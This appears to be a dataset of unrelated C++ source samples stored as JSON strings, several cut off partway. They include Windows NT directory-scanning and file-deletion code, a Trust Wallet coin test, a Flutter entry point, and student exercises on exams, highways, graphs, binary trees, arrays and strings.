1))\n\t\t\t\t{\n\t\t\t\t\tp->Start(&oa);\n\t\t\t\t\tp->Release();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tInterlockedIncrementNoFence(&pTask->_M_Files);\n\t\t\t\tInterlockedExchangeAddNoFence64(&pTask->_M_sizes, pfdi->EndOfFile.QuadPart);\n\n\t\t\t\tif (bDelete)\n\t\t\t\t{\n\t\t\t\t\tNTSTATUS status;\n\n\t\t\t\t\tif (0 <= (status = NtOpenFile(&hFile, DELETE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, \n\t\t\t\t\t\tFILE_OPEN_FOR_BACKUP_INTENT|FILE_OPEN_REPARSE_POINT|FILE_DELETE_ON_CLOSE)))\n\t\t\t\t\t{\n\t\t\t\t\t\tNtClose(hFile);\n\t\t\t\t\t}\n\n\t\t\t\t\tif (0 > status)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (0 <= (status = NtOpenFile(&hFile, DELETE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, \n\t\t\t\t\t\t\tFILE_OPEN_FOR_BACKUP_INTENT|FILE_OPEN_REPARSE_POINT)))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstatus = SetDelete(hFile);\n\t\t\t\t\t\t\tNtClose(hFile);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tif (0 > status)\n\t\t\t\t\t{\n\t\t\t\t\t\tpTask->SetError(status, &oa);\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tInterlockedIncrementNoFence(&pTask->_M_nDeletedFiles);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t} while (NextEntryOffset = pfdi->NextEntryOffset);\n\t}\n\n\tvoid Query()\n\t{\n\t\tif (NT_IRP* irp = new NT_IRP(this, er))\n\t\t{\n\t\t\tNTSTATUS status;\n\n\t\t\tstatus = NtQueryDirectoryFile(getHandle(), 0, 0, irp, irp, \n\t\t\t\t_M_buf, sizeof(_M_buf), FileDirectoryInformation, FALSE, 0, FALSE);\n\n\t\t\tirp->CheckNtStatus(this, status);\n\t\t}\n\t}\n\n\tvirtual void IOCompletionRoutine(\n\t\tDWORD Code, \n\t\tNTSTATUS status, \n\t\tULONG_PTR dwNumberOfBytesTransfered, \n\t\tPVOID /*Pointer*/)\n\t{\n\t\tif (er != Code)\n\t\t{\n\t\t\t__debugbreak();\n\t\t}\n\n\t\tif (0 > status)\n\t\t{\n\t\t\tif (STATUS_NO_MORE_FILES == status)\n\t\t\t{\n\t\t\t\tDecFiles();\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\treturn;",
    "// SPDX-License-Identifier: Apache-2.0\n//\n// Copyright \u00a9 2017 Trust Wallet.\n//\n// This is a GENERATED FILE, changes made here MAY BE LOST.\n// Generated one-time (codegen/bin/cointests)\n//\n\n#include \"TestUtilities.h\"\n#include <TrustWalletCore/TWCoinTypeConfiguration.h>\n#include <gtest/gtest.h>\n\n\nTEST(TWAionCoinType, TWCoinType) {\n    auto symbol = WRAPS(TWCoinTypeConfigurationGetSymbol(TWCoinTypeAion));\n    auto txId = WRAPS(TWStringCreateWithUTF8Bytes(\"t123\"));\n    auto txUrl = WRAPS(TWCoinTypeConfigurationGetTransactionURL(TWCoinTypeAion, txId.get()));\n    auto accId = WRAPS(TWStringCreateWithUTF8Bytes(\"a12\"));\n    auto accUrl = WRAPS(TWCoinTypeConfigurationGetAccountURL(TWCoinTypeAion, accId.get()));\n    auto id = WRAPS(TWCoinTypeConfigurationGetID(TWCoinTypeAion));\n    auto name = WRAPS(TWCoinTypeConfigurationGetName(TWCoinTypeAion));\n\n    ASSERT_EQ(TWCoinTypeConfigurationGetDecimals(TWCoinTypeAion), 18);\n    ASSERT_EQ(TWBlockchainAion, TWCoinTypeBlockchain(TWCoinTypeAion));\n    ASSERT_EQ(0x0, TWCoinTypeP2shPrefix(TWCoinTypeAion));\n    ASSERT_EQ(0x0, TWCoinTypeStaticPrefix(TWCoinTypeAion));\n    assertStringsEqual(symbol, \"AION\");\n    assertStringsEqual(txUrl, \"https://mainnet.aion.network/#/transaction/t123\");\n    assertStringsEqual(accUrl, \"https://mainnet.aion.network/#/account/a12\");\n    assertStringsEqual(id, \"aion\");\n    assertStringsEqual(name, \"Aion\");\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cw_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\n#include <fstream>\nusing namespace std;\n\nstring getCurrentTime() {\n    time_t now = time(0);\n    tm* ltm = localtime(&now);\n    char buffer[20];\n    strftime(buffer, sizeof(buffer), \"%Y-%m-%d %H:%M:%S\", ltm);\n    return string(buffer);\n}\n\nclass Exam {\npublic:\n    string subject;\n    string date;\n    string startTime;\n    int duration; \n    string endTime;\n    string status;\n\n    Exam(string _subject, string _date, string _startTime, int _duration)\n        : subject(_subject), date(_date), startTime(_startTime), duration(_duration), status(\"Scheduled\") {\n        calculateEndTime();\n    }\n\n    void calculateEndTime() {\n        int hour = stoi(startTime.substr(0, 2));\n        int minute = stoi(startTime.substr(3, 2));\n\n        minute += duration;\n        hour += minute / 60;\n        minute = minute % 60;\n\n        endTime = (hour < 10 ? \"0\" : \"\") + to_string(hour) + \":\" + (minute < 10 ? \"0\" : \"\") + to_string(minute);\n    }\n\n    bool isOverlapping(const Exam& other) const {\n        if (date != other.date) return false;\n        return (startTime < other.endTime && endTime > other.startTime);\n    }\n\n    void displayExamInfo() const {\n        cout << \"Subject: \" << subject << \"\\nDate: \" << date << \"\\nStart Time: \" << startTime\n             << \"\\nEnd Time: \" << endTime << \"\\nDuration: \" << duration << \" minutes\"\n             << \"\\nStatus: \" << status << \"\\n\";\n    }\n\n    void updateStatus(const string& newStatus) {\n        status = newStatus;\n    }\n};\n\n// ExamTimeManagementSystem class to manage exams\nclass ExamTimeManagementSystem {\nprivate:\n    vector<Exam> exams;\n    map<string, vector<string>> examHistory; \n\n    void autoResolveConflicts(Exam& newExam) {\n        for (auto& exam : exams) {\n            if (newExam.isOverlapping(exam)) {\n                cout << \"Conflict detected with exam: \" << exam.subject << \"\\n\";\n                // Attempt to reschedule conflicting exam\n                auto newTime = getNewTimeSlot();\n                exam.startTime = newTime.first;\n                exam.calculateEndTime();\n                cout << \"Rescheduled exam: \" << exam.subject << \" to new time: \" << exam.startTime << \"\\n\";\n            }\n        }\n    }\n\n    pair<string, string> getNewTimeSlot() {\n        string newStartTime = \"14:00\"; \n        return {newStartTime, \"16:00\"}; \n    }\n\npublic:\n    void scheduleExam(const string& subject, const string& date, const string& startTime, int duration) {\n        Exam newExam(subject, date, startTime, duration);\n        autoResolveConflicts(newExam); \n\n        exams.push_back(newExam);\n        cout << \"Exam scheduled successfully.\\n\";\n        logExamHistory(subject, \"Scheduled\");\n    }\n\n    void displayAllExams() const {\n        if (exams.empty()) {\n            cout << \"No exams scheduled.\\n\";\n            return;\n        }\n\n        for (const auto& exam : exams) {\n            exam.displayExamInfo();\n            cout << \"--------------------------------\\n\";\n        }\n    }\n\n    void updateExamStatus(const string& subject, const string& newStatus) {\n        for (auto& exam : exams) {\n            if (exam.subject == subject) {\n                exam.updateStatus(newStatus);\n                cout << \"Status updated successfully for \" << subject << \".\\n\";\n                logExamHistory(subject, newStatus);\n                return;\n            }\n        }\n        cout << \"Exam not found!\\n\";\n    }\n\n    void setReminder(const string& subject, int minutesBefore) {\n        for (const auto& exam : exams) {\n            if (exam.subject == subject) {\n                cout << \"Reminder set for \" << subject << \" \" << minutesBefore << \" minutes before the exam.\\n\";\n                // Simulating a reminder (In real application, use threading or scheduling library)\n                this_thread::sleep_for(chrono::seconds(5)); \n                cout << \"Reminder: Your exam for \" << subject << \" is scheduled soon!\\n\";\n                return;\n            }\n        }\n        cout << \"Exam not found!\\n\";\n    }\n\n    void generatePerformanceReport() const {\n        cout << \"Exam Performance Report:\\n\";\n        for (const auto& exam : exams) {\n            cout << \"Subject: \" << exam.subject << \", Status: \" << exam.status << \"\\n\";\n        }\n    }\n\n    void logExamHistory(const string& subject, const string& status) {\n        examHistory[subject].push_back(status);\n    }\n\n    void displayExamHistory() const {\n        if (examHistory.empty()) {\n            cout << \"No exam history available.\\n\";\n            return;\n        }\n\n        cout << \"Exam History:\\n\";\n        for (const auto& entry : examHistory) {\n            cout << \"Subject: \" << entry.first << \"\\nHistory:\\n\";\n            for (const auto& status : entry.second) {\n                cout << \" - \" << status << \"\\n\";\n            }\n        }\n    }\n\n    void loadExamsFromCSV(const string& fileName) {\n        ifstream file(fileName);\n        if (!file.is_open()) {\n            cout << \"Error opening file \" << fileName << \"\\n\";\n            retu",
    "/*=====================================================================\nProgram:  A program to indicate whether it is a primary or auxiliary highway\nAuthor: Dipesh Pandit , rab347\nClass: CS.1428.H01\nInstructor: Dr. Ziliang Zong\nDate: Sep 21, 2024\nDescription:\nInput: -5, 1000\nOutput: \"You are not paying attention. Please read the manual. Program exiting\"\nCompilation instructions:\nUsage:\nModifications:\nDate Comment: Sep 21, 2024\n---- ------------------------------------------------\n======================================================================*/\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n\n    int highway_number, attempt = 0;\n    bool toggle = true;\n    string direction;\n\n    while (toggle)\n    {\n        if (attempt == 0)\n        {\n            cout << \"Please enter the number of a highway (range 1-999): \";\n        }\n        else\n        {\n            cout << \"Please try again: \";\n        }\n        cin >> highway_number;\n\n        if (highway_number > 0 && highway_number < 100)\n        {\n            if (highway_number % 2 == 0)\n            {\n                cout << \"I-\" << highway_number << \" is primary, going east/west.\" << endl;\n            }\n            else\n            {\n                cout << \"I-\" << highway_number << \" is primary, going north/south.\" << endl;\n            }\n            toggle = false;\n        }\n        else if (highway_number >= 100 && highway_number < 1000)\n        {\n            int primaryHighway = (highway_number % 100);\n            if (primaryHighway != 0)\n            {\n                if (primaryHighway % 2 == 0)\n                {\n                    direction = \"east/west\";\n                }\n                else\n                {\n                    direction = \"north/south\";\n                }\n                cout << \"I-\" << highway_number << \" is auxiliary, serving I-\" << primaryHighway << \", going \" << direction << \".\";\n                toggle = false;\n            }\n            else\n            {\n                cout << highway_number << \" is not a valid auxiliary highway \" << endl;\n            }\n        }\n        else\n        {\n            if (attempt == 0)\n            {\n                cout << \"Incorrect number. \";\n                attempt++;\n            }\n            else\n            {\n                cout << \"You are not paying attention. Please read the manual.\" << endl;\n                cout << \"Program exiting\";\n                toggle = false;\n            }\n        }\n    }\n}\n",
    "#include \"mygraph_view.h\"\n\nAbstractGraph::AbstractGraph(MyGraphicsView* view) {\n    this->view = view;\n}\n\nMySationItem* AbstractGraph::addVex(QPointF center, QString name) {\n    // \u786e\u5b9aid\n    int id;\n    if (vMaxId + 1 == vNum) {\n        id = vNum;\n        vMaxId += 1;\n        vInfo.append(vNode());\n    } else {\n        id = vLastDelete;\n        vLastDelete = vInfo[id].invFirst;\n    }\n    ++vNum;\n    name += QString::number(id);\n    // \u8bbe\u7f6e\u4fe1\u606f\n    vInfo[id].isExist = true;\n    vInfo[id].inDegree = 0;\n    vInfo[id].outDegree = 0;\n    vInfo[id].posFirst = -1;\n    vInfo[id].invFirst = -1;\n    vInfo[id].Ve = 0;\n    vInfo[id].Vl = 0;\n    // \u65b0\u5efaitem\n    vInfo[id].sationAt = new MySationItem(id, center, name, view);\n    return vInfo[id].sationAt;\n}\n\nMyEdgeItem* AbstractGraph::addEdge(int from,\n                                   int to,\n                                   enum myShape style,\n                                   int weight) {\n    // \u9ed8\u8ba4\u5df2\u7ecf\u68c0\u67e5\u597d\n    // \u786e\u5b9aid\n    int id;\n    if (eMaxId + 1 == eNum) {\n        id = eNum;\n        eMaxId += 1;\n        eInfo.append(eNode());\n        posList.append(-1);\n        invList.append(-1);\n    } else {\n        id = eLastDelete;\n        eLastDelete = eInfo[id].from;\n    }\n    ++eNum;\n    // \u8bbe\u7f6e\u4fe1\u606f\n    eInfo[id].isExist = true;\n    eInfo[id].from = from;\n    eInfo[id].to = to;\n    eInfo[id].weight = weight;\n    eInfo[id].e = 0;\n    eInfo[id].l = 0;\n    // \u4fee\u6539\u6b63\u9006\u90bb\u63a5\u8868(\u5934\u63d2\u6cd5)\n    posList[id] = vInfo[from].posFirst;\n    vInfo[from].posFirst = id;\n    ++vInfo[from].outDegree;\n\n    invList[id] = vInfo[to].invFirst;\n    vInfo[to].invFirst = id;\n    ++vInfo[to].inDegree;\n\n    // \u65b0\u5efaitem\n    eInfo[id].edgeAt = new MyEdgeItem(id, style, view);\n    return eInfo[id].edgeAt;\n}\n\nbool AbstractGraph::checkExist(int from, int to) {\n    if (from > vMaxId || to > vMaxId)\n        return false;\n    if (!vInfo[from].isExist || !vInfo[to].isExist)\n        return false;\n    return true;\n}\n\nbool AbstractGraph::checkNoLoop(int from, int to) {\n    if (from == to)\n        return false;\n    else\n        return true;\n}\n\nbool AbstractGraph::checkNoRepetition(int from, int to) {\n    for (int e = vInfo[from].posFirst; e != -1; e = posList[e]) {\n        if (eInfo[e].to == to)\n            return false;\n    }\n    return true;\n}\n\nvoid AbstractGraph::setEdgeWeidght(int id, int weight) {\n    eInfo[id].weight = weight;\n}\n\nvoid AbstractGraph::deleteVex(int id) {\n    // \u5220\u9664\u51fa\u8fb9\u3001\u5165\u8fb9\n    for (int e = vInfo[id].posFirst; e != -1; e = posList[e]) {\n        deleteEdge(e);\n    }\n    for (int e = vInfo[id].invFirst; e != -1; e = invList[e]) {\n        deleteEdge(e);\n    }\n    // \u5220\u9664\u70b9\n    --vNum;\n    vInfo[id].isExist = false;\n    vInfo[id].invFirst = vLastDelete;\n    vLastDelete = id;\n    // \u79fb\u9664\u56fe\u5143\n    view->myGraphicsScene->removeItem(vInfo[id].sationAt);\n    delete vInfo[id].sationAt;\n}\n\nvoid AbstractGraph::deleteEdge(int id) {\n    // \u90bb\u63a5\u8868\u4e2d\u5220\u9664\u8fb9\n    // \u6b63\u90bb\u63a5\u8868\n    int e;\n    e = vInfo[eInfo[id].from].posFirst;\n    if (e == id) {\n        // \u7b2c\u4e00\u6761\u8fb9\n        vInfo[eInfo[id].from].posFirst = posList[e];\n        --vInfo[eInfo[id].from].outDegree;\n    } else {\n        for (; posList[e] != id; e = posList[e])\n            ;\n        posList[e] = posList[id];\n        --vInfo[eInfo[id].from].outDegree;\n    }\n    // \u9006\u90bb\u63a5\u8868\n    e = vInfo[eInfo[id].to].invFirst;\n    if (e == id) {\n        // \u7b2c\u4e00\u6761\u8fb9\n        vInfo[eInfo[id].to].invFirst = invList[e];\n        --vInfo[eInfo[id].to].inDegree;\n    } else {\n        for (; invList[e] != id; e = invList[e])\n            ;\n        invList[e] = invList[id];\n        --vInfo[eInfo[id].to].inDegree;\n    }\n    // \u79fb\u9664\u56fe\u5143\n    view->myGraphicsScene->removeItem(eInfo[id].edgeAt);\n    delete eInfo[id].edgeAt;\n    // \u7ef4\u62a4\u4fe1\u606f\n    --eNum;\n    eInfo[id].isExist = false;\n    eInfo[id].from = eLastDelete;\n    eLastDelete = id;\n}\n\n\nint AbstractGraph::save(QString filePath)\n{\n    QFile out(filePath);\n    if (out.open(QIODevice::WriteOnly | QIODevice::Text)) {\n        QTextStream ts(&out);\n        //\u70b9\n        ts << vMaxId << \" \" << vLastDelete << Qt::endl;\n        for (vNode v : vInfo) {\n            ts << v.isExist << \" \" ;\n            if (v.isExist){\n                ts << v.sationAt->name << \" \";\n                QPointF center = v.sationAt->getCenter();\n                ts << center.x() << \" \" << center.y() << Qt::endl;\n            }\n            else\n                ts << v.invFirst << Qt::endl;\n        }\n        //\u8fb9\n        ts << eMaxId << \" \" << eLastDelete <<Qt::endl;\n        for (eNode e : eInfo) {\n            ts << e.isExist << \" \" ;\n            if (e.isExist){\n                ts << e.from << \" \" << e.to << \" \" << e.weight << \" \";\n                ts << (int)e.edgeAt->style << Qt::endl;\n            }\n            else\n                ts << e.from << Qt::endl;\n        }\n\n        out.close();\n        return 0;\n    }\n    else {\n        return -1;\n    }\n}\n\nint AbstractGraph::read(QString filePath)\n{\n    QFile in(filePath);\n    if (in.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        QTextStream ts(&in);\n        int isExist;\n        //\u70b9\n        ts >> ",
    "\ufeff#include <iostream>\n#include <set> // \u0411\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430, \u0445\u0440\u0430\u043d\u044f\u0449\u0430\u044f \u0432 \u0441\u0435\u0431\u0435 \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044e \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u0433\u043e \u0434\u0435\u0440\u0435\u0432\u0430 (\u043a\u043b\u0430\u0441\u0441 set)\n#include <exception>\ntemplate <typename ANY>\nclass BinaryTree {\n\nprivate:\n\tstruct Node {\n\t\tANY value = ANY();\n\t\tNode* left = nullptr;\n\t\tNode* right = nullptr;\n\t};\n\tNode* root;\n\n\tvoid insert(ANY value, Node* node) {\n\t\tif (value < node->value) {\n\t\t\tif (node->left == nullptr) {\n\t\t\t\tnode->left = new Node;\n\t\t\t\tnode->left->value = value;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tinsert(value, node->left);\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\tif (value > node->value) {\n\t\t\tif (node->right == nullptr) {\n\t\t\t\tnode->right = new Node;\n\t\t\t\tnode->right->value = value;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tinsert(value, node->right);\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t}\n\n\tvoid delete_node(Node* node) {\n\n\t\tif (node != nullptr) {\n\t\t\tdelete_node(node->left);\n\t\t\tdelete_node(node->right);\n\t\t\tdelete node;\n\t\t}\n\t}\n\n\tvoid print(Node* node) {\n\t\tif (node != nullptr) {\n\t\t\tprint(node->left);\n\t\t\tstd::cout << node->value << ' ';\n\t\t\tprint(node->right);\n\t\t}\n\t}\n\n\tbool find(ANY value, Node* node) const {\n\t\tif (node == nullptr) {\n\t\t\treturn false;\n\t\t}\n\t\tif (value == node->value) {\n\t\t\treturn true;\n\t\t}\n\t\tif (value < node->value) {\n\t\t\treturn find(value, node->left);\n\t\t}\n\t\telse {\n\t\t\treturn find(value, node->right);\n\t\t}\n\t}\npublic:\n\tBinaryTree() : root(nullptr) {};\n\t\n\t~BinaryTree() {\n\t\n\t\tdelete_node(root);\n\t};\n\n\tvoid insert(ANY value) {\n\t\tif (root == nullptr) {\n\t\t\troot = new Node;\n\t\t\troot->value = value;\n\t\t\treturn;\n\t\t}\n\t\tinsert(value, root);\n\n\t}\n\tvoid print() {\n\t\tprint(root);\n\t\tstd::cout << std::endl;\n\t}\n\n\tbool find(ANY value) const {\n\t\treturn find(value, root);\n\t}\n};\n\n\n\n\n\n\n\n\nint main() {\n\tsetlocale(0, \"Russian\");\n\n\t// \u041a\u043b\u0430\u0441\u0441 set\n\tstd::set<int> set1;\n\tset1.insert(30);\n\tset1.insert(50);\n\tset1.insert(20);\n\tset1.insert(40);\n\tset1.erase(40);\n\tstd::cout<< \"size: \" << set1.size() << std::endl;\n\n\t//std::set<int>::iterator it = set1.begin();\n\n\t//for (auto el : set1) // \u0446\u0438\u043a\u043b forEach \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0442 \u043d\u0430\u0447\u0430\u043b\u0430 \u0434\u043e \u043a\u043e\u043d\u0446\u0430. \u041d\u0435 \u043c\u043e\u0436\u0435\u043c \u043c\u0435\u043d\u044f\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438.\n\t//for (std::set<int>::const_iterator it = set1.cbegin(); it != set1.cend(); ++it)\n\n\tfor (auto el : set1)\n\t\tstd::cout << el << ' ';\n\tstd::cout << std::endl;\n\n\n\n\tBinaryTree<int> bt;\n\tbt.insert(70);\n\tbt.insert(40);\n\tbt.insert(100);\n\tbt.insert(30);\n\tbt.insert(50);\n\tbt.insert(90);\n\tbt.insert(35);\n\n\tbt.print();\n\n\tstd::cout << (bt.find(40) ? \"true\" : \"false\") << std::endl;\n\tstd::cout << (bt.find(27) ? \"true\" : \"false\") << std::endl;\n\tstd::cout << (bt.find(90) ? \"true\" : \"false\") << std::endl;\n\n\treturn 0;\n}",
    "#include <iostream>\n#include <cstdlib> \n#include <ctime>\n#include <cmath>\n\nusing namespace std;\nint message (int n, int M, int m){\n    if ((n <= M) and (n >= m)){\n        return n;\n    }else {\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e n \u043e\u0442 [1 \u0434\u043e 30]!!! = \";\n        cin >> n;\n        return message (n, M, m);\n    }\n}\nint main(){\n    const int M = 30;\n    const int m = 1;\n    int n;\n    bool b;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e n \u043e\u0442 [1 \u0434\u043e 30] = \";\n    cin >> n;\n    n = message (n, M, m);\n    int* array = new int[n];\n    cout << \"\u0415\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0437\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432 \u0432\u0440\u0443\u0447\u043d\u0443\u044e \u0432\u0432\u0435\u0434\u0438\u0442\u0435 1\" << endl << \"\u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0437\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0447\u0438\u0441\u043b\u0430 \u0440\u0430\u043d\u0434\u043e\u043c\u043e\u043c \u0432\u0432\u0435\u0434\u0438\u0442\u0435 0\" << endl;\n    cin >> b;\n    if (b == 1){\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0441\u0435 \u0447\u0438\u0441\u043b\u0430 \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u0431\u0435\u043b \";\n        for (int i = 0; i < n; ++i){\n            cin >> array[i];\n        }\n        cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \u0447\u0438\u0441\u0435\u043b: \";\n        for (int i = 0; i < n; ++i){\n            cout << array[i] << \" \";\n        }\n    }else {\n        int start; \n        int end;\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0438\u0436\u043d\u0438\u0439 \u0434\u0438\u0430\u043f\u043e\u0437\u043e\u043d \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 = \";\n        cin >> start;\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0435\u0440\u0445\u043d\u0438\u0439 \u0434\u0438\u0430\u043f\u043e\u0437\u043e\u043d \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 = \";\n        cin >> end;\n        srand(time(0));\n        cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \u0447\u0438\u0441\u0435\u043b: \";\n        for (int i = 0; i < n; ++i){\n            array[i] = rand() % (end - start + 1) + start;\n            cout << array[i] << \" \";\n        }\n    }\n    cout << endl;\n    int min = fabs(array[0]);\n    for (int i = 0; i < n; ++i){\n        if (fabs(array[i]) < min){\n            min = fabs(array[i]);\n        }\n    }\n    cout << \"\u041d\u0430\u0438\u043c\u0435\u043d\u044c\u0448\u0435\u0435 \u043f\u043e \u043c\u043e\u0434\u0443\u043b\u044e \u0447\u0438\u0441\u043b\u043e = \" << min << endl;\n    int sum = 0;\n    int pos = -1;\n    for (int i = 0; i < n; ++i){\n        if (array[i] == 0){\n            pos = i;\n        }\n    }\n    if (pos == -1){\n        cout << \"\u0412 \u044d\u0442\u043e\u043c \u043c\u0430\u0441\u0441\u0438\u0432\u0435 \u043d\u0435\u0442 \u043d\u0443\u043b\u0435\u0432\u043e\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\" << endl;\n    }else{\n        for (int i = pos; i < n; ++i){\n            sum += array[i];\n        }\n        cout << \"\u0421\u0443\u043c\u043c\u0430 \u043f\u043e\u0441\u043b\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u043d\u0443\u043b\u0435\u0432\u043e\u0433\u043e \u0447\u043b\u0435\u043d\u0430 = \" << sum << endl;\n    }    \n    int evenindex = 0;\n    for (int i = 0; i < n; ++i) {\n        if (i % 2 == 0) {\n            int temp = array[i];\n            int j = i;\n            while (j > evenindex) {\n                array[j] = array[j - 1];\n                --j;\n            }\n            array[evenindex] = temp;\n            ++evenindex;\n        }\n    }\n    cout << \"\u041d\u043e\u0432\u044b\u0439 \u043c\u0430\u0441\u0438\u0438\u0432: \";\n    for(int i = 0; i < n; ++i){\n        cout << array[i] << \" \";\n    }\n    delete []array;\n    return 0;\n}",
    "\ufeff#include <iostream>\n\nclass String {\nprotected:\n    char* data;\n    size_t size;\n\npublic:\n\n    String() : data(nullptr), size(0) {}\n\n    String(const char* str) {\n        size = 0;\n        while (str[size] != '\\0') {\n            ++size;\n        }\n        data = new char[size + 1];\n        for (size_t i = 0; i < size; ++i) {\n            data[i] = str[i];\n        }\n        data[size] = '\\0';\n    }\n\n    String(const String& other) {\n        size = other.size;\n        data = new char[size + 1];\n        for (size_t i = 0; i < size; ++i) {\n            data[i] = other.data[i];\n        }\n        data[size] = '\\0';\n    }\n\n    String& operator=(const String& other) {\n        if (this != &other) {\n            delete[] data;\n            size = other.size;\n            data = new char[size + 1];\n            for (size_t i = 0; i < size; ++i) {\n                data[i] = other.data[i];\n            }\n            data[size] = '\\0';\n        }\n        return *this;\n    }\n\n    size_t length() const {\n        return size;\n    }\n\n    void clear() {\n        delete[] data;\n        data = nullptr;\n        size = 0;\n    }\n\n    ~String() {\n        delete[] data;\n    }\n\n    String operator+(const String& other) const {\n        char* newData = new char[size + other.size + 1];\n        for (size_t i = 0; i < size; ++i) {\n            newData[i] = data[i];\n        }\n        for (size_t i = 0; i < other.size; ++i) {\n            newData[size + i] = other.data[i];\n        }\n        newData[size + other.size] = '\\0';\n        String newString(newData);\n        delete[] newData;\n        return newString;\n    }\n\n    bool operator==(const String& other) const {\n        if (size != other.size) {\n            return false;\n        }\n        for (size_t i = 0; i < size; ++i) {\n            if (data[i] != other.data[i]) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    bool operator!=(const String& other) const {\n        return !(*this == other);\n    }\n\n    void print() const {\n        if (data) {\n            for (size_t i = 0; i < size; ++i) {\n                std::cout << data[i];\n            }\n        }\n    }\n};\n\nclass BitString : public String {\nprivate:\n    bool CheckingInput(const char* str) {\n        size_t i = 0;\n        while (str[i] != '\\0') {\n            if (str[i] != '0' && str[i] != '1') {\n                clear();\n                return false;\n            }\n            ++i;\n        }\n        return true;\n    }\npublic:\n    BitString(const char* str) : String() {\n        if (CheckingInput(str)) {\n            size = 0;\n            while (str[size] != '\\0') {\n                ++size;\n            }\n            data = new char[size + 1];\n            for (size_t i = 0; i < size; ++i) {\n                data[i] = str[i];\n            }\n            data[size] = '\\0';\n        }\n    }\n\n\n};\n\nint main() {\n    String s1(\"Hello \");\n    String s2(\"World\");\n    String s3 = s1 + s2;\n    s3.print();\n    std::cout << std::endl;\n\n    BitString b1(\"101010\");\n    BitString b2(\"1001\");\n    BitString b3(\"10a01\");\n\n    b1.print();\n    std::cout << std::endl;\n    b2.print();\n    std::cout << std::endl;\n    b3.print();\n\n    return 0;\n}",
